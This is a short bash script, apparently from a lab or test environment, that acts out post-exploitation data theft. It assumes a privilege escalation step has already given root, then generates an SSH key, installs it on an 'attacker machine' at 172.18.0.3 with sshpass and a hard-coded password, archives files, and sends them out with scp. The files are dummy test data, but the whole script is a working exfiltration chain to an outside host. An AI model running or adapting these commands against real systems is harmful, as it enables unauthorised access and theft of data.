#!/bin/bash

# Run PEexploit.sh located at /home/resch to ensure that privilege escalation has happened and the current user is root

# Generate SSH key pair and copy it to the attacker machine:
ssh-keygen -t rsa -f /root/.ssh/id_rsa_Cserver_test1 -N ""
chmod 400 /root/.ssh/id_rsa_Cserver_test1.pub
sshpass -p "vagrant" ssh-copy-id -i /root/.ssh/id_rsa_Cserver_test1.pub vagrant@172.18.0.3

# Generate some example files and tar them so that the .tar.gz file can be exfiltrated
mkdir -p /root/test/stuff
cd /root/test/stuff
echo "owuoqwdjhoasjdo" > test1.txt
echo "sadasdcasdac" > test2.txt
echo "owuoqwdjhasdadasdasoasjdo" > test3.txt
echo "owuoqasdacdsacdsadscadscadsacdwdjhoasjdo" > test4.txt
touch exfiltrate.tar.gz
tar --exclude=exfiltrate.tar.gz -zcf exfiltrate.tar.gz .

# Send the tar file to attacker using scp
scp -i /root/.ssh/id_rsa_Cserver_test1 /root/test/stuff/exfiltrate.tar.gz vagrant@172.18.0.3:/home/vagrant/exfiltrated/